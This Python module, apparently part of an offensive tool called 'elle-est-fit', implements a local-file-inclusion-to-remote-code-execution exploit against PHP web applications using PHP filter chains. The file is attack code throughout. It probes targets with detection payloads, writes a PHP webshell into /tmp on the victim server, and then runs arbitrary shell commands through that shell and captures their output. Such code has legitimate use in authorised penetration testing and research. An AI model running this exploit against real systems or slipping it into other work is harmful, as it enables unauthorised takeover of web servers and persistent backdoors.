"""
PHP Filter technique implementation for LFI to RCE exploitation.

This technique uses PHP filters to convert an LFI vulnerability to RCE
by chaining PHP filters to create arbitrary PHP code.
"""

import base64
import logging
import re
import random
import string
import time
import urllib.parse
from typing import Optional, Dict

import requests

from ..exceptions import TechniqueError, ExecutionError
from ..techniques.base import TechniqueBase
from ..payloads.filter_chain import generate_filter_chain

logger = logging.getLogger("elle-est-fit")


class PHPFilterTechnique(TechniqueBase):
    """
    Exploit LFI using the PHP filter chain technique.
    
    This technique uses PHP's filter functionality to chain multiple filters
    together and generate arbitrary code that will be executed by the PHP engine.
    """
    
    name = "php_filters"
    description = "LFI to RCE via PHP filter chain"
    
    def __init__(self, **kwargs):
        """Initialize the PHP filter technique."""
        super().__init__(**kwargs)
        self.wrapper_path = "php://temp"  # Default resource to use
        self.shell_token = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        self.detection_string = f"ELLEESTFIT_{self.shell_token}"
        self.verbose = kwargs.get('verbose', False)
    
    def check(self) -> bool:
        """
        Check if the target is vulnerable to the PHP filter technique.
        
        Returns:
            True if the technique is viable, False otherwise
        """
        logger.info("Checking if target is vulnerable to PHP filter technique")
        
        # Try different detection payloads
        payloads = [
            f"<?php echo '{self.detection_string}'; ?>",
            f"<?php print('{self.detection_string}'); ?>",
            f"<?php die('{self.detection_string}'); ?>"
        ]
        
        for payload in payloads:
            try:
                filter_chain = generate_filter_chain(payload)
                if self.verbose:
                    logger.debug(f"Using filter chain for detection: {filter_chain[:100]}...")
                
                # Try to include the filter chain
                result = self.leak_function(filter_chain)
                
                if self.verbose:
                    # Print a reasonable portion of the response
                    preview = result[:500] if len(result) > 500 else result
                    logger.debug(f"Response preview:\n{preview}")
                
                # Check if our detection string is in the response
                if self.detection_string in result:
                    logger.info(f"Target is vulnerable to PHP filter technique! Detection string found: {self.detection_string}")
                    logger.debug(f"Detection string position: {result.find(self.detection_string)}")
                    return True
            except Exception as e:
                logger.debug(f"Error during check: {str(e)}")
                continue
        
        logger.info("Target does not appear vulnerable to PHP filter technique")
        return False
    
    def exploit(self) -> bool:
        """
        Exploit the LFI using PHP filters to achieve RCE.
        
        Returns:
            True if successful, False otherwise
        """
        logger.info("Exploiting using PHP filter technique")
        
        # Create a webshell payload
        shell_filename = f"/tmp/shell_{self.shell_token}.php"
        
        # Generate the payload to create a shell file
        payload = f"""<?php
        $shell_code = '<?php {self.php_code} ?>';
        file_put_contents('{shell_filename}', $shell_code);
        echo "SHELL_CREATED:{shell_filename}";
        ?>"""
        
        # Generate the filter chain for this payload
        filter_chain = generate_filter_chain(payload)
        
        # Execute the payload to create the shell file
        result = self.leak_function(filter_chain)
        
        # Check if shell was created
        if "SHELL_CREATED:" in result:
            # Extract the shell path
            match = re.search(r"SHELL_CREATED:(.*)", result)
            if match:
                self.shell_path = match.group(1).strip()
                logger.info(f"Shell created at {self.shell_path}")
                return True
        
        logger.error("Failed to create shell via PHP filter technique")
        return False
    
    def execute(self, command: str) -> str:
        """
        Execute a command via the established RCE.
        
        Args:
            command: Command to execute
            
        Returns:
            Command output
        """
        if not self.shell_path:
            raise ExecutionError("No shell established. Run exploit() first.")
        
        # Encode the command
        encoded_command = urllib.parse.quote(command)
        
        # Create a payload to execute the command and capture output
        payload = f"""<?php
        $output = '';
        if (file_exists('{self.shell_path}')) {{
            ob_start();
            include '{self.shell_path}';
            $output = ob_get_clean();
        }} else {{
            $output = 'Shell file not found at {self.shell_path}';
        }}
        echo "CMD_OUTPUT_START\\n" . $output . "\\nCMD_OUTPUT_END";
        ?>"""
        
        # Generate the filter chain for this payload
        filter_chain = generate_filter_chain(payload)
        
        # Execute the payload
        result = self.leak_function(filter_chain + f"&cmd={encoded_command}")
        
        # Extract the command output
        match = re.search(r"CMD_OUTPUT_START\n(.*?)\nCMD_OUTPUT_END", result, re.DOTALL)
        if match:
            return match.group(1)
        else:
            raise ExecutionError("Failed to execute command or parse output")